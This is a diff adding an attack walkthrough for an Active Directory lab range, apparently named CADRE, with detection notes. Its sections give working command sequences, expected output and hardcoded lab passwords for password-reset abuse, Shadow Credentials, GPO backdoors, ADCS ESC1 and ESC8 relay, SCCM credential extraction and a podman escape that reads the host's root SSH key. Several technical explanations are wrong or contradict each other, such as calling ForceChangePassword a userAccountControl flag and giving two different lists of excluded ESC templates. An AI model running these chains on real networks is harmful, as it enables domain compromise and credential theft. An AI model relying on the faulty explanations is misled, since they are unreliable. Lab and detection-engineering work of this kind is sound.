@@ -2211,3 +2211,637 @@ range.local\krbtgt:502:hash:::
 - [ ] All 3 domains compromised
 
 ---
+
+
+## Mechanics: Branch A — ACL Abuse (cadre.local)
+
+**Status:** Partially tested (ACE#18 in Phase 2). Other 13 ACEs are configured by `05-ad-attack-surface.yml` but not yet exploited.
+
+### Why it works
+AD ACLs are the most common misconfiguration in real environments. CADRE's `05-ad-attack-surface.yml` configures 14 ACEs across all 3 domains — each one a separate attack path. Most paths use one of:
+- **ForceChangePassword**: reset target user's password
+- **GenericAll / GenericWrite / WriteDacl**: add yourself to a group, modify target
+- **AddKeyCredentialLink (Shadow Credentials)**: add certificate to user → PKINIT auth
+
+### Mechanics: WT015 — ForceChangePassword (Fastest to DA)
+
+**ACE#7**: `hunter_dfir → chief_command: ForceChangePassword`
+
+#### Why it works
+The `User-Force-Change-Password` extended right (0x00010000 in `userAccountControl`) allows the trustee to reset the target's password without knowing the current one. Combined with `Reset Password` permission (granted via `User-Force-Change-Password`), the attacker can:
+1. Reset `chief_command`'s password
+2. Authenticate as chief_command (DA in cadre.local)
+3. Full domain compromise
+
+This is the FASTEST path to cadre.local DA. ACE#7 is in `05-ad-attack-surface.yml` line for `hunter_dfir → chief_command: ForceChangePassword`.
+
+#### Attack command
+```bash
+# Step 1 — Reset chief_command password
+bloodyAD --host 192.168.77.10 -d cadre.local \
+    -u hunter_dfir -p 'DF1R_Hunt3r!' \
+    set password "CN=chief_command,OU=Command,DC=cadre,DC=local" \
+    'Pwn3d_DA!'
+
+# Step 2 — Authenticate as chief_command (DA in cadre.local)
+impacket-psexec cadre.local/chief_command:'Pwn3d_DA!'@dc01.cadre.local
+```
+
+#### What to expect (success)
+```
+[*] Requesting shares on dc01.cadre.local.....
+[*] Found writable share ADMIN$
+[*] Uploading payload.....
+[*] Opening SVCManager on dc01.cadre.local.....
+[*] Creating service RadPXs on dc01.cadre.local.....
+[*] Remote service Started successfully
+[!] Trying to start RemoteEXE on dc01.cadre.local.....
+nt authority\system  ← SYSTEM on dc01
+```
+
+#### What to expect (failure modes)
+- **Access Denied on password reset**: ACE#7 not deployed. Verify in `05-ad-attack-surface.yml`.
+- **Login fails after reset**: `chief_command` may be smart-card required or disabled. Check `Get-ADUser`.
+- **"Network path not found"**: Wrong DC. cadre.local = dc01 (192.168.77.10), not child.cadre.local.
+
+#### CADRE-specific notes
+- **ACE#7**: `hunter_dfir → chief_command: ForceChangePassword` — configured in `05-ad-attack-surface.yml`
+- **hunter_dfir password**: `DF1R_Hunt3r!` (verifiable in `cadre_passwords.txt`)
+- **chief_command** is in `OU=Command,DC=cadre,DC=local` — DA in cadre.local
+- **Domain**: cadre.local (root) — gives full forest access
+- **Faster than ACE#18 path** (Phase 2) because no bridge user needed
+
+#### Telemetry fingerprint
+- **WinSec 4738** (user account was changed): chief_command password reset
+- **WinSec 4724** (an attempt was made to reset an account's password): the reset attempt
+- **WinSec 4624** (logon): chief_command login from attacker IP
+- **WinSec 4672** (special privileges): DA logon = admin-equivalent
+- **Sysmon EID 1** (ProcessCreate): bloodyAD, PsExec, cmd
+
+#### Detection engineering
+- **WinSec 4738 + 4724 within 1 min, then 4624 within 5 min**: high signal for force-change exploit
+- **4662 on user object before reset**: ACL read (for ACE discovery)
+- **bloodyAD signature**: known tool name in process
+
+#### Common pitfalls
+- **Wrong ACE**: ACE#7 specifically applies to `chief_command`. Other ForceChangePassword ACEs are different.
+- **Stale ACL check**: bloodHound should show ACE#7. If missing, run `05-ad-attack-surface.yml` again.
+- **Domain confusion**: ACE#7 is in cadre.local, not child.cadre.local. Use dc01 (.10).
+
+#### Reproduction checklist
+- [ ] ACE#7 confirmed in BloodHound (`hunter_dfir → chief_command: ForceChangePassword`)
+- [ ] hunter_dfir credential available
+- [ ] bloodyAD or ldap3 can connect to dc01:389
+- [ ] Password reset succeeds
+- [ ] DA login succeeds
+- [ ] SYSTEM shell on dc01
+
+---
+
+### Mechanics: WT008 — Shadow Credentials on dc01$
+
+**ACE#6**: `ops_redcell → dc01$: GenericWrite`
+
+#### Why it works
+Shadow Credentials is a 2021 ADCS-based persistence + lateral movement technique. If you have `GenericWrite` (or `WriteProperty` on `msDS-KeyCredentialLink`) on a user/computer, you can add a certificate (KeyCredential) to the object. The KDC then accepts PKINIT auth with that certificate → you authenticate as the target without knowing their password.
+
+For `dc01$` (Domain Controller), this means authenticating as the DC machine account = DCSync privileges = full domain compromise.
+
+#### Attack command
+```bash
+# Step 1 — Add Shadow Credential
+certipy-ad shadow auto \
+    -u 'ops_redcell@cadre.local' -p 'R3dC3ll_0ps!' \
+    -account 'dc01$' \
+    -dc-ip 192.168.77.10
+
+# Step 2 — Authenticate as dc01$ using the certificate
+certipy-ad auth -pfx dc01.pfx \
+    -dc-ip 192.168.77.10 \
+    -domain cadre.local \
+    -username dc01$
+# This gives you an LDAP shell as dc01$ = DCSync rights
+```
+
+#### What to expect (success)
+```
+[*] Adding KeyCredential to dc01$
+[*] dc01$ TGT obtained
+[*] Opening LDAP shell as dc01$
+ldap> whoami
+cadre.local\dc01$
+```
+
+#### What to expect (failure modes)
+- **`Access Denied`**: ACE#6 not deployed. Verify GenericWrite on dc01$.
+- **Certipy fails to PKINIT**: KDC doesn't support PKINIT. Verify with `certipy-ad find`.
+- **Certificate expired**: Shadow Creds default to 1 year. Check `notAfter` on the cert.
+
+#### CADRE-specific notes
+- **ACE#6**: `ops_redcell → dc01$: GenericWrite` — `05-ad-attack-surface.yml`
+- **ops_redcell password**: `R3dC3ll_0ps!`
+- **dc01$** is the root domain DC. Authenticating as it = DCSync
+- **Tool**: certipy (Windows + Linux) — auto-handles the KeyCredential injection
+
+#### Telemetry fingerprint
+- **WinSec 4738** (user account was changed): dc01$ has new msDS-KeyCredentialLink
+- **WinSec 4624** (logon) Type 3 (network): PKINIT auth with certificate
+- **4768/4769** (TGT/TGS): PKINIT-issued tickets (PreAuthType: 16)
+- **ADCS event log**: certificate request (if going through CA)
+
+#### Detection engineering
+- **msDS-KeyCredentialLink modification**: WinSec 4738 on computer object
+- **PKINIT PreAuthType=16**: notable in WinSec 4768
+- **Elastic rule (planned)**: `event.code:4738 AND target_dn:*CN=Key*` = Shadow Creds
+- **DC-side detection**: 4625 on PKINIT failure (cert validation)
+
+#### Common pitfalls
+- **Wrong ACE**: ACE#6 is GenericWrite, not FullControl. certipy needs WriteProperty on msDS-KeyCredentialLink specifically.
+- **PKINIT requires ADCS**: Not all KDCs support it. Modern AD does by default.
+- **Domain functional level**: Need 2016+ for PKINIT.
+
+#### Reproduction checklist
+- [ ] ACE#6 confirmed in BloodHound
+- [ ] ops_redcell credential
+- [ ] certipy installed (latest)
+- [ ] Shadow credential added
+- [ ] PKINIT auth succeeds
+- [ ] LDAP shell as dc01$ obtained
+- [ ] DCSync via dc01$ shell succeeds
+
+---
+
+### Mechanics: WT014 — GenericWrite → Shadow Credentials
+
+**ACE#4**: `Cloud-Cadre → Agentic-Cadre: GenericWrite`
+
+#### Why it works
+Same as WT008 (Shadow Credentials), but starting from a group GenericWrite. The group is `Agentic-Cadre` — the attacker can add themselves to the group via Shadow Credentials attack, gaining all privileges of the group's members.
+
+If `Agentic-Cadre` contains DAs or high-priv users, this is a path to DA. Per CAMPAIGNS.md, the group likely contains service accounts or specific priv users.
+
+#### Attack command
+```bash
+# Step 1 — Add a user to Agentic-Cadre (via Shadow Creds)
+certipy-ad shadow auto \
+    -u 'cloud_user@cadre.local' -p 'Cl0ud_Eng!' \
+    -account 'Agentic-Cadre' \
+    -dc-ip 192.168.77.10
+
+# Step 2 — Authenticate as Agentic-Cadre (using KeyCredential)
+certipy-ad auth -pfx Agentic-Cadre.pfx ...
+
+# Alternative: AddMember via ACL write (older technique)
+bloodyAD --host 192.168.77.10 -d cadre.local \
+    -u cloud_user -p 'Cl0ud_Eng!' \
+    add group-member "CN=Agentic-Cadre,OU=..." \
+    "CN=Cloud-Cadre,..."
+```
+
+#### CADRE-specific notes
+- **ACE#4**: `Cloud-Cadre → Agentic-Cadre: GenericWrite` — `05-ad-attack-surface.yml`
+- **Path**: Cloud-Cadre group members → add to Agentic-Cadre group → inherit Agentic-Cadre privileges
+- **May require group expansion**: depends on what's in Agentic-Cadre group
+
+---
+
+### Mechanics: WT013 — WriteDacl Self-Escalate
+
+**ACE#3**: `Engineering-Cadre → Red-Cadre: WriteDacl`
+
+#### Why it works
+`WriteDacl` allows the trustee to modify the target's DACL. The attacker:
+1. Grants `GenericAll` to themselves on Red-Cadre
+2. Adds themselves as member of Red-Cadre group
+3. Inherits all Red-Cadre privileges
+
+If Red-Cadre contains DAs or priv users, this is a path to DA.
+
+#### Attack command
+```bash
+bloodyAD --host 192.168.77.10 -d cadre.local \
+    -u engineering_user -p 'Eng_L3ad!' \
+    add genericall "CN=Red-Cadre,OU=RedCell,DC=cadre,DC=local" \
+    "cadre.local\lead_engineering"
+
+bloodyAD --host 192.168.77.10 -d cadre.local \
+    -u engineering_user -p 'Eng_L3ad!' \
+    add group-member "CN=Red-Cadre,OU=RedCell,DC=cadre,DC=local" \
+    "lead_engineering"
+```
+
+#### CADRE-specific notes
+- **ACE#3**: `Engineering-Cadre → Red-Cadre: WriteDacl`
+- **Engineering-Cadre** is a group; need a member to exploit
+- **Path**: 2 steps — add GenericAll, then add member
+
+---
+
+### Mechanics: WT023 — GPO Abuse (T1484)
+
+**ACE#1**: `analyst_cloud → Vulnerable-GPO: GpoEditDeleteModifySecurity`
+
+#### Why it works
+GPOs control the domain-joined machines' settings. If you can edit a GPO that's linked to an OU containing privileged users, you can:
+1. Modify the GPO to add a scheduled task or startup script
+2. The task runs as SYSTEM on every machine in the OU
+3. Code execution as SYSTEM = local admin = potential path to DA
+
+For `Vulnerable-GPO` linked to `OU=Command` (where `chief_command` lives), modifying it gives code execution on `chief_command`'s machine.
+
+#### Attack command
+```bash
+# Step 1 — Modify GPO via PowerShell (or PyGPOAbuse)
+# From a machine with GPMC + analyst_cloud cred
+Import-Module GroupPolicy
+# Get the GPO
+$gpo = Get-GPO -Name "Vulnerable-GPO"
+# Add immediate scheduled task
+Set-GPPrefRegistryValue -Name "Vulnerable-GPO" -Context Computer \
+    -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
+    -ValueName "Backdoor" -Type String -Value "powershell -enc ..."
+# Or use bloodyAD to add GPO task directly
+bloodyAD --host 192.168.77.10 -d cadre.local \
+    -u analyst_cloud -p 'Cl0ud_An@lyst!' \
+    add gpo-task -n "Vulnerable-GPO" -t "Immediate" \
+    -c "powershell.exe -enc <add_user_to_DA>"
+
+# Step 2 — Force GPO update on target machines
+gpupdate /target:computer /force  # on dc01
+```
+
+#### CADRE-specific notes
+- **ACE#1**: `analyst_cloud → Vulnerable-GPO: GpoEditDeleteModifySecurity` — `05-ad-attack-surface.yml`
+- **Vulnerable-GPO** linked to `OU=Command` (per CAMPAIGNS.md Branch A)
+- **analyst_cloud** is in `OU=Cloud` — but has GPO edit rights on the policy
+- **Tool**: bloodyAD has built-in `add gpo-task` for this
+- **Faster than scheduled task path**: GPO applies to all machines in OU, no need to wait for specific user logon
+
+---
+
+## Mechanics: Branch B — ADCS (ESC1-ESC14)
+
+**Status:** Untested. 12 ESC templates configured in `08-adcs-verify.yml` (CADRE-ESC1 through CADRE-ESC14 minus 12, 15).
+
+### Why it works
+AD CS (Active Directory Certificate Services) is Microsoft's PKI. Misconfigurations (called ESC1-ESC14 by SpecterOps in "Certified Pre-Owned") allow attackers to:
+- **ESC1**: Enroll in a vulnerable template, supply SAN for any user → get cert as that user
+- **ESC2**: Any Purpose EKU + enrollee supplies subject
+- **ESC6**: EDITF_ATTRIBUTESUBJECTALTNAME2 — server-wide flag
+- **ESC8**: NTLM relay to ADCS web enrollment
+- etc.
+
+ESC1 is the most impactful — get a cert as `Administrator` from any user with Enroll rights.
+
+### Mechanics: ESC1 — Enrollee Supplies Subject
+
+#### Why it works
+The `CADRE-ESC1` template has:
+- `Manager approval: False` (anyone can request)
+- `Enrollee Supplies Subject: True` (attacker controls the SAN)
+- `Client Authentication EKU` (cert can be used for auth)
+
+Attacker requests a cert with `UPN=Administrator@cadre.local` → KDC issues cert as Administrator → cert used for PKINIT auth → DA.
+
+#### Attack command
+```bash
+# Step 1 — Find vulnerable templates
+certipy-ad find -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' \
+    -dc-ip 192.168.77.10
+# Look for ESC1 vulnerable templates (manager approval=False, enrollee supplies subject=True)
+
+# Step 2 — Request cert as Administrator
+certipy-ad req -ca cadre-CA -template CADRE-ESC1 \
+    -upn administrator@cadre.local \
+    -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' \
+    -dc-ip 192.168.77.10
+# Output: administrator.pfx
+
+# Step 3 — Authenticate using the cert
+certipy-ad auth -pfx administrator.pfx \
+    -dc-ip 192.168.77.10 \
+    -domain cadre.local
+
+# Step 4 — Use the resulting TGT for DCSync
+export KRB5CCNAME=administrator.ccache
+impacket-secretsdump -just-dc cadre.local/ -k -no-pass -dc-ip 192.168.77.10
+```
+
+#### What to expect (success)
+```
+[*] Requesting certificate
+[*] Got certificate with UPN: administrator@cadre.local
+[*] Saving PFX to administrator.pfx
+[*] Trying to authenticate as administrator@cadre.local
+[*] TGT obtained! Saved to administrator.ccache
+```
+
+#### What to expect (failure modes)
+- **`Access Denied`**: User doesn't have Enroll rights on the template. Check BloodHound.
+- **`Manager approval required`**: Template requires approval (not ESC1).
+- **Certipy PKINIT fails**: KDC doesn't support PKINIT. Verify CA functionality.
+
+#### CADRE-specific notes
+- **CA name**: `cadre-CA` (on dc01.cadre.local)
+- **12 ESC templates** in `08-adcs-verify.yml` (CADRE-ESC1 through 14, minus 5, 12, 15)
+- **analyst_dfir** has Enroll on most templates (per ACE#5 GenericAll on OU=Command)
+- **Tool**: certipy (https://github.com/ly4k/certipy) — Linux + Windows compatible
+- **Out of scope**: ESC5 (CA ACL not configured), ESC12 (no formal def), ESC15 (Server 2025 rejects v1)
+
+#### Telemetry fingerprint
+- **ADCS event log 4886** (certificate issued): template, requester, subject
+- **ADCS event log 4887** (certificate request): template
+- **WinSec 4624**: PKINIT auth (PreAuthType=16)
+- **WinSec 4768/4769**: TGT/TGS via PKINIT
+
+#### Detection engineering
+- **ESC1 detection**: ADCS event 4886 with template having `Enrollee Supplies Subject=True` and `Client Authentication EKU`
+- **PKINIT monitoring**: 4768 with PreAuthType=16 — distinguish from password-based auth
+- **Elk SIEM rule (planned)**: 4886 + cert subject != requester UPN = ESC1 indicator
+- **certipy signature**: known tool name in process
+
+#### Common pitfalls
+- **Wrong CA name**: `cadre-CA` not the hostname
+- **Wrong DC for dc01**: cadre.local = dc01 (192.168.77.10)
+- **Certipy version**: Use latest. Old versions don't support some ESC variants.
+- **SAN vs UPN**: Some templates use SAN, others UPN. Check template properties.
+
+#### Reproduction checklist
+- [ ] `08-adcs-verify.yml` ran (CA + templates deployed)
+- [ ] CA accessible at `\\dc01.cadre.local\cadre-CA`
+- [ ] analyst_dfir (or similar) has Enroll on CADRE-ESC1
+- [ ] certipy find identifies ESC1 vulnerability
+- [ ] certipy req succeeds
+- [ ] certipy auth succeeds
+- [ ] DCSync with resulting TGT works
+
+---
+
+### Mechanics: ESC8 — NTLM Relay to ADCS Web Enrollment
+
+**Why it works**
+The ADCS web enrollment (`/certsrv/certfnsh.asp`) is an HTTP endpoint that accepts NTLM auth. If you can coerce a target user to authenticate to your machine, you can relay that auth to ADCS web enrollment and get a cert as the user.
+
+Combined with coercion (Phase 5), this is a one-shot path: Coercer → ntlmrelayx → cert → PKINIT → TGT.
+
+#### Attack command
+```bash
+# Step 1 — Set up ntlmrelayx with ADCS module
+ntlmrelayx.py -t http://cadre-dc01-ca.cadre.local/certsrv/certfnsh.asp \
+    --adcs --template CADRE-ESC1 -smb2support
+
+# Step 2 — Trigger coercion (from another terminal)
+coercer coerce -l <attacker_ip> -t 192.168.77.10 \
+    -d cadre.local -u attacker_user -p 'password' \
+    --spoolsample
+
+# Step 3 — ntlmrelayx auto-issues cert, save as .pfx
+# Step 4 — Use cert for PKINIT auth (same as ESC1)
+```
+
+#### CADRE-specific notes
+- **ADCS web enrollment** on dc01 (per `08-adcs-verify.yml`)
+- **CertSrv app pool as NetworkService**: vulnerable to NTLM relay
+- **Requires coercion** — combine with Phase 5 (PrinterBug)
+- **Output**: cert as coerced user (e.g., dc01$ if coercing a DC)
+
+#### Telemetry fingerprint
+- **ADCS event 4886**: cert request received
+- **NTLM relay detection**: WinSec 4624 Type 3 followed by HTTP request to /certsrv/
+
+#### Detection engineering
+- **HTTP POST to /certsrv/ from non-CA IP** = relay signal
+- **4624 Type 3 then immediate 4886 from same source**: high confidence
+
+---
+
+## Mechanics: Branch C — SCCM Escalation (range.local)
+
+**Status:** Untested. SCCM site configured in `10-sccm-verify.yml` (mbr02, site code CAD).
+
+### Why it works
+SCCM (System Center Configuration Manager / Microsoft Endpoint Configuration Manager) has a hierarchical attack surface:
+- **NAA (Network Access Account)**: stored in site DB, decryptable
+- **Client Push**: forces machines to authenticate to attacker SMB
+- **PXE boot**: extracts task sequence secrets
+- **CMPivot**: arbitrary query on all clients
+
+If `svc_sccm` is SCCM Full Admin, you can compromise the site, extract NAA creds, then use NAA for lateral movement.
+
+### Mechanics: WT034 — NAA Extraction (Fastest to range.local DA)
+
+#### Why it works
+SCCM uses a Network Access Account for client-to-distribution-point auth. The NAA creds are stored in the site database (`C:\Program Files\Microsoft Configuration Manager\MPC\CMNPROD.SDF` or similar), encrypted with a key derivable from the local machine.
+
+`svc_sccm` is SCCM Full Admin → can read the site DB → extract NAA creds. In CADRE, `svc_naa` is over-privileged as DA in range.local.
+
+#### Attack command
+```bash
+# From mbr02 (or remote with admin creds)
+# Use SharpSCCM or ConfigManBearPig
+SharpSCCM.exe get naa -s mbr02.range.local
+# Returns: RANGE\svc_naa : N@A_s3rv1c3!
+
+# Alternative: read the NAA bait file on the vault share
+smbclient //mbr02/vault -U range.local/svc_sccm%'s3rv1c3_SCCM!' \
+    -c "get naa-rotation-notice.txt"
+# Returns: Network Access Account RANGE\svc_naa : N@A_s3rv1c3!
+```
+
+#### What to expect (success)
+```
+[*] Querying WMI for site info
+[*] Found NAA: RANGE\svc_naa : N@A_s3rv1c3!
+```
+
+#### What to expect (failure modes)
+- **SharpSCCM can't connect to mbr02**: Need admin on mbr02. Use Phase 8 chain (Kerberoast svc_sccm first).
+- **NAA bait file not found**: SCCM vault share not configured. Check `10-sccm-verify.yml`.
+
+#### CADRE-specific notes
+- **svc_sccm** is SCCM Full Admin on site CAD
+- **svc_naa** is DA in range.local (per ACE#23 — analyst_osint → svc_naa: GenericAll)
+- **NAA password**: `N@A_s3rv1c3!`
+- **Tool**: SharpSCCM (https://github.com/Mayyhem/SharpSCCM)
+
+#### Telemetry fingerprint
+- **WinSec 4662** (SCCM DB file access): site DB read
+- **WinSec 4624**: svc_naa logon from attacker IP after exploitation
+- **Sysmon EID 1** (ProcessCreate): SharpSCCM.exe
+
+#### Detection engineering
+- **SCCM DB access from non-admin**: suspicious
+- **SCCM log**: client push accounts, NAA usage
+
+#### Common pitfalls
+- **SharpSCCM Windows-only**: needs .NET runtime. Use ConfigManBearPig (PowerShell) for Linux equivalent.
+- **Wrong SCCM server**: mbr02 (192.168.77.23), not mbr01
+- **NAA over-privilege**: If svc_naa is NOT DA, this attack doesn't escalate. Verify in BloodHound.
+
+---
+
+### Mechanics: WT035 — PXE Boot Abuse
+
+#### Why it works
+SCCM PXE boot images contain task sequences with credentials. If you can extract the boot image and decrypt it, you get the task sequence creds.
+
+#### Attack command
+```bash
+# From mbr02 (with SCCM admin)
+SharpSCCM.exe get pxe -s mbr02.range.local
+# Returns: boot image path + creds embedded in task sequence
+```
+
+#### CADRE-specific notes
+- **Tool**: SharpSCCM get pxe
+- **Requires SCCM admin** — chain from WT034
+
+---
+
+### Mechanics: WT037 — CMPivot Abuse
+
+#### Why it works
+CMPivot allows running arbitrary queries on all SCCM clients. Equivalent to running commands on every managed machine.
+
+#### Attack command
+```bash
+SharpSCCM.exe invoke cmpivot -s mbr02.range.local \
+    -q "SELECT * FROM Win32_Process WHERE Name = 'lsass.exe'"
+```
+
+---
+
+## Mechanics: Branch D — Linux Pivot (linux01)
+
+**Status:** Untested. Linux01 configured in `07-linux-config.yml` (Ubuntu 24.04, SSSD, NFS krb5p, podman privileged).
+
+### Why it works
+linux01 is AD-joined (SSSD) and has multiple post-exploitation paths:
+- **MSSQL linked server** (from mbr01): recon linux01 via SQL
+- **Podman container escape**: root on linux01
+- **SSSD ticket cache**: cached Kerberos tickets for offline use
+- **NFS krb5p**: mount NFS share with kerberos auth → file access
+- **MSSQL keytab**: extract service keytab → mssql creds
+
+### Mechanics: WT048 — Podman Container Escape (T1611)
+
+#### Why it works
+CADRE's linux01 has `podman` configured with **privileged** mode (per `07-linux-config.yml`). Privileged containers can use `unshare` to access the host filesystem. If the attacker has any user on linux01, they can escape to root.
+
+#### Attack command
+```bash
+# From linux01 (any user)
+sudo podman exec cadre-monitor unshare -r id
+# Should return root in the host's namespace
+
+sudo podman exec cadre-monitor cat /proc/1/root/root/.ssh/id_rsa
+# Read host's root SSH key
+```
+
+#### What to expect (success)
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### What to expect (failure modes)
+- **`permission denied`**: podman not in sudoers, or container not privileged
+- **Container not found**: `cadre-monitor` doesn't exist. Use `podman ps -a`
+
+#### CADRE-specific notes
+- **linux01** (192.168.77.40) — Ubuntu 24.04, AD-joined
+- **Podman privileged mode** — per `07-linux-config.yml`
+- **Initial entry**: via MSSQL linked server (WT044) from mbr01 SQL chain
+- **Escalation**: podman escape → root on linux01
+
+#### Telemetry fingerprint
+- **auditd SYSCALL** execve: podman, unshare
+- **auditd CWD**: /home/analyst_cloud or similar
+- **SSH logs**: root login from 192.168.77.40 (post-escape)
+
+#### Detection engineering
+- **auditd**: `unshare -r` calls
+- **podman logs**: exec events
+- **SSH from unusual source**: root from non-admin
+
+#### Common pitfalls
+- **Podman in rootless mode**: doesn't have the same escape. Verify with `podman info`.
+- **No podman binary**: check `which podman` first
+- **Container doesn't exist**: `podman ps -a` to find available containers
+
+---
+
+### Mechanics: WT044 — MSSQL Linked Server Recon
+
+#### Why it works
+mbr01's MSSQL has a linked server to linux01. From mssqlclient on mbr01, attacker can execute queries against linux01.
+
+#### Attack command
+```sql
+-- From mssqlclient on mbr01 (as analyst_t1 → IMPERSONATE sa)
+SELECT * FROM OPENQUERY("LINUX01", 'SELECT name FROM sys.databases')
+```
+
+#### CADRE-specific notes
+- **Linked server**: LINUX01 (per `09-sql-wsus-verify.yml`)
+- **Recon**: enumerate databases, users, permissions on linux01
+- **Chain**: enables all other Branch D attacks
+
+---
+
+### Mechanics: WT046 — MSSQL Keytab Extraction
+
+#### Why it works
+MSSQL on linux01 uses a keytab for Kerberos auth (`/var/opt/mssql/secrets/mssql.keytab`). The mssql service account is in AD. Extracting the keytab gives you the service principal's NTHash, which can be used for S4U2Self/S4U2Proxy attacks.
+
+#### Attack command
+```bash
+# From linux01 (root via WT048)
+sudo klist -ket /var/opt/mssql/secrets/mssql.keytab
+# Returns: service principal + key versions
+```
+
+#### CADRE-specific notes
+- **Keytab path**: `/var/opt/mssql/secrets/mssql.keytab` (Ubuntu 24.04 + MSSQL)
+- **mssql** SPN: `MSSQLSvc/linux01.cadre.local:1433`
+- **Post-extraction**: use `impacket-getST` for S4U2 abuse
+
+---
+
+### Mechanics: WT047 — NFS krb5p Mount
+
+#### Why it works
+linux01 exports NFS share with krb5p security. With a valid Kerberos ticket for the right principal, attacker can mount and access the share.
+
+#### Attack command
+```bash
+# With kerberos ticket for svc_nfs (or admin user)
+export KRB5CCNAME=/tmp/admin.ccache
+sudo mount -t nfs -o sec=krb5p localhost:/exports/secure-share /mnt/cadre-nfs
+ls /mnt/cadre-nfs
+```
+
+#### CADRE-specific notes
+- **NFS export**: `/exports/secure-share` (per `07-linux-config.yml`)
+- **Security**: krb5p (privacy + authentication)
+- **Requires**: valid Kerberos ticket (obtain via WT044 recon + Phase 3 chain)
+
+---
+
+### Mechanics: WT045 — SSSD Ticket Extraction
+
+#### Why it works
+SSSD caches Kerberos tickets in `/var/lib/sss/db/`. Extracting these gives you offline auth for the cached principals.
+
+#### Attack command
+```bash
+# From linux01
+sudo cp /var/lib/sss/db/cache_cadre.local.ldb /tmp/
+# Use SSSDTools or impacket to extract
+```
+
+#### CADRE-specific notes
+- **SSSD cache**: `/var/lib/sss/db/cache_cadre.local.ldb`
+- **Tool**: SSSDTools or impacket-secretsdump
+- **Cached tickets**: TGT for any user that logged in offline
+
+---
